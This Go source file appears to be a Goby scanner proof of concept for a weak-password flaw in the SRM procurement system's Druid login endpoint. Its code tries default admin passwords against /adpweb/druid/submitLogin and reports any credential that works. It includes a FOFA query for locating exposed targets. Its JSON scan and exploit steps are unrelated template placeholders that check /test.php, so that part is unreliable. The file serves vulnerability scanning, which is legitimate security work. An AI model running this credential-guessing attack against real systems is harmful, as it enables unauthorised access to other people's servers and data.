package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "SRM /adpweb/druid/submitLogin Weak Password Vulnerability",
    "Description": "<p>Account passwords are considered to be the first line of defense for network security, and although identity authentication technology is constantly evolving, enterprise account passwords will not disappear. Every organization has different degrees of weak passwords, and no matter how much effort we invest in security, attackers may attack through weak passwords. According to the data, among the many attack methods, the use of weak passwords accounts for as many as 70%.</p>",
    "Product": "SRM-System",
    "Homepage": "https://www.zhilink.com/SRM.html",
    "DisclosureDate": "2024-10-21",
    "PostTime": "2024-10-24",
    "Author": "wangzhao@baimaohui.net",
    "FofaQuery": "title==\"SRM 2.0\" && body=\"assets/js/jweixin-1.4.0.js\"",
    "GobyQuery": "title==\"SRM 2.0\" && body=\"assets/js/jweixin-1.4.0.js\"",
    "Level": "0",
    "Impact": "<p>An attacker can exploit this vulnerability to directly enter the application system or management system, tamper with or delete the system, web page, and data, illegally obtain the data of the system and users, and may even cause the server to fall.</p>",
    "Recommendation": "<p>1. Don't use common weak passwords as passwords</p><p> 2. Don't use the same set of passwords for multiple systems or social accounts </p><p> 3. Change your password regularly</p>",
    "References": [
        "https://blog.csdn.net/weixin_43167326/article/details/139290555"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "mode",
            "type": "select",
            "value": "default",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Weak Password"
    ],
    "VulType": [
        "Weak Password"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "5.6",
    "Translation": {
        "CN": {
            "Name": "SRM智联云采系统 /adpweb/druid/submitLogin 弱口令漏洞",
            "Product": "智互联",
            "Description": "<p>账号口令被认为是网络安全的第一道防线，尽管身份认证技术在不断演进，但企业的账号口令不会消失。每个组织都存在不同程度的弱口令，无论我们在安全防护上投入了多大的人力物力，攻击者都可能通过弱口令进行攻击。根据数据显示，在众多攻击手段中，利用弱口令攻击的占比高达70%。<br></p>",
            "Recommendation": "<p>1、不要使用常见的弱口令作为密码</p><p>2、不要多个系统或者社交账号使用同一套密码</p><p>3、定期修改密码</p>",
            "Impact": "<p>攻击者利用此漏洞可直接进入应用系统或者管理系统，从而进行系统、网页、数据的篡改与删除，非法获取系统、用户的数据，甚至可能导致服务器沦陷。<br></p>",
            "VulType": [
                "弱口令"
            ],
            "Tags": [
                "弱口令"
            ]
        },
        "EN": {
            "Name": "SRM /adpweb/druid/submitLogin Weak Password Vulnerability",
            "Product": "SRM-System",
            "Description": "<p>Account passwords are considered to be the first line of defense for network security, and although identity authentication technology is constantly evolving, enterprise account passwords will not disappear. Every organization has different degrees of weak passwords, and no matter how much effort we invest in security, attackers may attack through weak passwords. According to the data, among the many attack methods, the use of weak passwords accounts for as many as 70%.<br></p>",
            "Recommendation": "<p>1. Don't use common weak passwords as passwords</p><p>&nbsp;2. Don't use the same set of passwords for multiple systems or social accounts&nbsp;</p><p>&nbsp;3. Change your password regularly<br></p>",
            "Impact": "<p>An attacker can exploit this vulnerability to directly enter the application system or management system, tamper with or delete the system, web page, and data, illegally obtain the data of the system and users, and may even cause the server to fall.<br></p>",
            "VulType": [
                "Weak Password"
            ],
            "Tags": [
                "Weak Password"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9966"
}`

	//请求发送
	//注意：本函数传入的参数为hostInfo
	//注意：模板编写后务必全局替换后面随机字符AAAA, POC检测函数也需要同步修改
	sendPayloadyp2Vnbp5 := func(hostInfo *httpclient.FixUrl) (bool, string, string) {
		// 注意：返回的第一个值为bool值，若弱口令登录成功请返回true，否则返回false
		// 注意：vulPath是默认口令请求路径，请以 "/login" 的格式返回
		// 注意：vulInfo是默认口令，请以 "admin:123456" 的格式返回
		vulPath := `/adpweb/druid/submitLogin`
		vulInfo := ``
		pwdInfoList := []string{`admin`, `god`, `root`}

		for _, pwdInfo := range pwdInfoList {
			postRequestConfig := httpclient.NewPostRequestConfig(vulPath)
			postRequestConfig.VerifyTls = false
			postRequestConfig.FollowRedirect = false
			postRequestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded; charset=UTF-8")
			postRequestConfig.Data = fmt.Sprintf("loginUsername=admin&loginPassword=%s", pwdInfo)
			//请求
			response, err := httpclient.DoHttpRequest(hostInfo, postRequestConfig)
			if err != nil {
				return false, vulInfo, vulPath
			}
			if strings.Contains(response.RawBody, "success") {
				vulInfo = "admin" + "@" + pwdInfo
				return true, vulInfo, vulPath
			}
		}
		return false, vulInfo, vulPath
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可
			respBool, vulInfo, vulPath := sendPayloadyp2Vnbp5(hostInfo)

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			if respBool {
				ss.VulURL = hostInfo.Scheme() + "://" + vulInfo + ":" + hostInfo.HostInfo + vulPath
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			// 如无特殊需求POC检测函数只需更改sendPayloadAAAA函数名即可

			// --------------------------------------------------
			// 请注意，后续为模板内容，正常情况下无需修改
			respBool, vulInfo, _ := sendPayloadyp2Vnbp5(expResult.HostInfo)
			if respBool {
				expResult.Output = `Please use "` + vulInfo + `" to login` + "\n" + "URL:" + expResult.HostInfo.FixedHostInfo + "/adpweb/druid"
				expResult.Success = true
				return expResult
			}
			expResult.Success = false
			return expResult

		},
	))
}
